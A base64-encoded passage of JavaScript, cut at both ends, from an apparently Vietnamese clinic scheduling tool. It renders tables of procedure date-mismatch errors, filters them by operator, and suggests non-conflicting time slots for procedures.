gICBpZiAoZGF0ZU1pc21hdGNoTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IGtow6FjIG5nw6B5IHRo4buxYyBoaeG7h24gbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIGRhdGVNaXNtYXRjaFNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jYWxlbmRhci1hbHQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nw6B5IHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3U8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBkYXRlTWlzbWF0Y2hMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IucHJvY2VkdXJlRGF0ZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5zdGFydERhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgIDwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgICBkYXRlTWlzbWF0Y2hTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYw0KICAgIHVwZGF0ZURhdGVNaXNtYXRjaE9wZXJhdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8gZGF0ZSBtaXNtYXRjaA0KZnVuY3Rpb24gdXBkYXRlRGF0ZU1pc21hdGNoT3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQoZGF0ZU1pc21hdGNoTG9nLm1hcChlcnJvciA9PiBlcnJvci5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCcpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEzhu41jIGRhdGUgbWlzbWF0Y2ggdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBmaWx0ZXJEYXRlTWlzbWF0Y2hCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaE9wZXJhdG9yU2VsZWN0JykudmFsdWU7DQogICAgY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gZGF0ZU1pc21hdGNoTG9nIA0KICAgICAgICA6IGRhdGVNaXNtYXRjaExvZy5maWx0ZXIoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWREYXRlTWlzbWF0Y2hFcnJvcnMoZmlsdGVyZWRFcnJvcnMpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgbOG7l2kgZGF0ZSBtaXNtYXRjaCDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWREYXRlTWlzbWF0Y2hFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBkYXRlTWlzbWF0Y2hMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGF0ZU1pc21hdGNoTG9nJyk7DQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgDQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IGtow6FjIG5nw6B5IHRo4buxYyBoaeG7h24gbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2FsZW5kYXItYWx0IGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8OgeSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IucHJvY2VkdXJlRGF0ZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5zdGFydERhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgIDwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KDQoNCg0KZnVuY3Rpb24gZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMocHJvY2VkdXJlcykgew0KICAgIGNvbnN0IHRpbWVPcHRpb24gPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJ0aW1lT3B0aW9uIl06Y2hlY2tlZCcpLnZhbHVlOw0KICAgIGNvbnN0IHN0YXJ0SG91ciA9IHRpbWVPcHRpb24gPT09ICc3OjMwJyA/IDcuNSA6IDc7DQogICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgYnVmZmVyTWludXRlcyA9IGlnbm9yZUFkamFjZW50ID8gMCA6IDE7DQogICAgY29uc3Qgc2hvd01vcmVTdWdnZXN0aW9ucyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIA0KICAgIC8vIFPhu5Ega2h1bmcgZ2nhu50gdOG7kWkgxJFhIG3hu5dpIGJ14buVaSAobuG6v3UgY2jhu41uIDYga2h1bmcgdGjDrCAzIHPDoW5nICsgMyBjaGnhu4F1KQ0KICAgIGNvbnN0IG1heE1vcm5pbmcgPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDI7DQogICAgY29uc3QgbWF4QWZ0ZXJub29uID0gc2hvd01vcmVTdWdnZXN0aW9ucyA/IDMgOiAxOw0KDQogICAgcHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICBpZiAoIXByb2MuY29uZmxpY3QpIHJldHVybjsNCg0KICAgICAgICBjb25zdCBzYW1lRGF5UHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gDQogICAgICAgICAgICBwLmRhdGUgPT09IHByb2MuZGF0ZSAmJiANCiAgICAgICAgICAgIHAub3BlcmF0b3IgPT09IHByb2Mub3BlcmF0b3IgJiYNCiAgICAgICAgICAgIHAucm93SW5kZXggIT09IHByb2Mucm93SW5kZXgNCiAgICAgICAgKTsNCg0KICAgICAgICBjb25zdCBkdXJhdGlvblNlY29uZHMgPSBwcm9jLmVuZCAtIHByb2Muc3RhcnQgKyAoYnVmZmVyTWludXRlcyAqIDYwKTsNCiAgICAgICAgDQogICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIHPDoW5nDQogICAgICAgIGNvbnN0IG1vcm5pbmdTbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIHN0YXJ0SG91ciAqIDM2MDAsIA0KICAgICAgICAgICAgMTEuNSAqIDM2MDAsIA0KICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgIHNhbWVEYXlQcm9jZWR1cmVzLCANCiAgICAgICAgICAgIG1heE1vcm5pbmcNCiAgICAgICAgKTsNCiAgICAgICAgDQogICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIGNoaeG7gXUNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uU2xvdHMgPSBmaW5kQXZhaWxhYmxlU2xvdHMoDQogICAgICAgICAgICAxMy41ICogMzYwMCwgDQogICAgICAgICAgICAxNyAqIDM2MDAsIA0KICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgIHNhbWVEYXlQcm9jZWR1cmVzLCANCiAgICAgICAgICAgIG1heEFmdGVybm9vbg0KICAgICAgICApOw0KDQogICAgICAgIC8vIEZvcm1hdCBr4bq/dCBxdeG6ow0KICAgICAgICBsZXQgc3VnZ2VzdGlvbnMgPSBbXTsNCiAgICAgICAgaWYgKG1vcm5pbmdTbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBzdWdnZXN0aW9ucy5wdXNoKCc8c3Ryb25nPlPDoW5nOjwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgbW9ybmluZ1Nsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQogICAgICAgIGlmIChhZnRlcm5vb25TbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBzdWdnZXN0aW9ucy5wdXNoKCc8c3Ryb25nPkNoaeG7gXU6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBhZnRlcm5vb25TbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgfQ0KDQogICAgICAgIA0KaWYgKG1vcm5pbmdTbG90cy5sZW5ndGggKyBhZnRlcm5vb25TbG90cy5sZW5ndGggPiAwKSB7DQogICAgcHJvYy5zdWdnZXN0aW9uID0gc3VnZ2VzdGlvbnMuam9pbignPGJyPicpOw0KfSBlbHNlIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KfQ0KDQogICAgfSk7DQp9DQovLyBIw6BtIGtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4NCmZ1bmN0aW9uIGhhc1RpbWVDb25mbGljdChzdGFydFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgZW5kVGltZSA9IHN0YXJ0VGltZSArIGR1cmF0aW9uOw0KICAgIA0KICAgIGZvciAoY29uc3QgcHJvYyBvZiBwcm9jZWR1cmVzKSB7DQogICAgICAgIGNvbnN0IHByb2NTdGFydCA9IHByb2Muc3RhcnQ7DQogICAgICAgIGNvbnN0IHByb2NFbmQgPSBwcm9jLmVuZCArIChwcm9jLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICANCiAgICAgICAgaWYgKChzdGFydFRpbWUgPj0gcHJvY1N0YXJ0ICYmIHN0YXJ0VGltZSA8IHByb2NFbmQpIHx8IA0KICAgICAgICAgICAgKGVuZFRpbWUgPiBwcm9jU3RhcnQgJiYgZW5kVGltZSA8PSBwcm9jRW5kKSB8fA0KICAgICAgICAgICAgKHN0YXJ0VGltZSA8PSBwcm9jU3RhcnQgJiYgZW5kVGltZSA+PSBwcm9jRW5kKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KLy8gSMOgbSB0w6xtIGtodW5nIGdp4budIHRy4buRbmcNCmZ1bmN0aW9uIGZpbmRBdmFpbGFibGVTbG90cyhzdGFydFRpbWUsIGVuZFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzLCBtYXhTbG90cykgew0KICAgIGNvbnN0IHNsb3RzID0gW107DQogICAgbGV0IGN1cnJlbnRUaW1lID0gc3RhcnRUaW1lOw0KICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGJ1ZmZlck1pbnV0ZXMgPSBpZ25vcmVBZGphY2VudCA/IDAgOiAxOw0KICAgIA0KICAgIHdoaWxlIChjdXJyZW50VGltZSArIGR1cmF0aW9uIDw9IGVuZFRpbWUgJiYgc2xvdHMubGVuZ3RoIDwgbWF4U2xvdHMpIHsNCiAgICAgICAgaWYgKCFoYXNUaW1lQ29uZmxpY3QoY3VycmVudFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSkgew0KICAgICAgICAgICAgc2xvdHMucHVzaCh7DQogICAgICAgICAgICAgICAgc3RhcnQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUpLA0KICAgICAgICAgICAgICAgIGVuZDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSArIChkdXJhdGlvbiAtIChidWZmZXJNaW51dGVzICogNjApKSkgLy8gVHLhu6sgYnVmZmVyIMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgY3VycmVudFRpbWUgKz0gMTUgKiA2MDsgLy8gS2nhu4NtIHRyYSBt4buXaSAxNSBwaMO6dA0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc2xvdHM7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gc2Vjb25kc1RvVGltZVN0cihzZWNvbmRzKSB7DQogICAgICAgICAgICBjb25zdCBob3VycyA9IE1hdGguZmxvb3Ioc2Vjb25kcyAvIDM2MDApOw0KICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IE1hdGguZmxvb3IoKHNlY29uZHMgJSAzNjAwKSAvIDYwKTsNCiAgICAgICAgICAgIHJldHVybiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YDsNCiAgICAgICAgfQ0KDQoNCi8vIMSQ4bq/bSB04buVbmcgY2EgInPhuq9jIHRodeG7kWMiIGtow6FjIMSRYSBz4buRIChvdXRsaWVyKQ0KZnVuY3Rpb24gZ2V0SGVyYk91dGxpZXJUb3RhbCgpIHsNCiAgY29uc3QgaGVyYnMgPSBBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgOiBbXTsNCiAgY29uc3QgY291bnRzQnlEYXRlID0ge307DQogIGhlcmJzLmZvckVhY2goaCA9PiB7DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBuID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBpZiAoIWNvdW50c0J5RGF0ZVtkXSkgY291bnRzQnlEYXRlW2RdID0ge307DQogICAgY291bnRzQnlEYXRlW2RdW25dID0gKGNvdW50c0J5RGF0ZVtkXVtuXSB8fCAwKSArIDE7DQogIH0pOw0KICBsZXQgb3V0bGllcnMgPSAwOw0KICBPYmplY3QudmFsdWVzKGNvdW50c0J5RGF0ZSkuZm9yRWFjaChtYXAgPT4gew0KICAgIGNvbnN0IGVudHJpZXMgPSBPYmplY3QuZW50cmllcyhtYXApLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsgaWYgKCF0b3ApIHJldHVybjsNCiAgICBjb25zdCB0b3BOYW1lID0gdG9wWzBdOw0KICAgIGVudHJpZXMuZm9yRWFjaCgoW25hbWUsIGNudF0pID0+IHsgaWYgKG5hbWUgIT09IHRvcE5hbWUpIG91dGxpZXJzICs9IGNudDsgfSk7DQogIH0pOw0KICByZXR1cm4gb3V0bGllcnM7DQp9DQoNCi8vIMSQ4bq/bSBs4buXaSBzYWkgdGjhu51pIGdpYW4gKGvhur90IHRow7pjIDw9IGLhuq90IMSR4bqndSwgxJHhu4tuaCBk4bqhbmcgc2FpLCBzYWkgcGjDunQgc28gduG7m2kgcXV5IMSR4buLbmgsLi4uKQ0KZnVuY3Rpb24gZ2V0VGltZUVycm9yVG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIGzhu5dpIMSRYW5nIGhp4buDbiB0aOG7iw0KICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsgLy8gdsO5bmcgYuG6o25nIGzhu5dpIHRo4budaSBnaWFuDQogIGlmICghY29udGFpbmVyKSByZXR1cm4gMDsNCiAgcmV0dXJuIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCd0ci5lcnJvci1yb3cnKS5sZW5ndGg7DQp9DQoNCmZ1bmN0aW9uIGdldENvbmZsaWN0VG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIHh1bmcgxJHhu5l0IHRyb25nIGvhur90IHF14bqjDQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsgLy8gdGJvZHkgY+G7p2EgYuG6o25nIGvhur90IHF14bqjDQogIGlmICghdGJvZHkpIHJldHVybiAwOw0KICByZXR1cm4gdGJvZHkucXVlcnlTZWxlY3RvckFsbCgndHIuY29uZmxpY3Qtcm93JykubGVuZ3RoOw0KfQ0KDQoNCg0KDQoNCg0KDQoNCiAgICAgICBmdW5jdGlvbiBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyA9IDApIHsNCiAgICBhbGxQcm9jZWR1cmVzID0gcHJvY2VkdXJlczsNCiAgICANCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChwcm9jZWR1cmVzLm1hcChwID0+IHAub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdEVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdEVycm9yLmlubmVySFRNTCA9IG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTDsgLy8gxJDhu5NuZyBi4buZIG7hu5lpIGR1bmcNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXJFcnJvcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpOw0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb3VudCA9IGNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGg7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24ga+G6v3QgcXXhuqMNCiAgICBpZiAoZXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgcmVzdWx0U2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJyk7DQogICAgICAgICAgICBpZiAocmVzdWx0U2VjdGlvbikgew0KICAgICAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKHJlc3VsdFNlY3Rpb24sIC00MCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sIDMwMCk7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBmaWx0ZXJCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9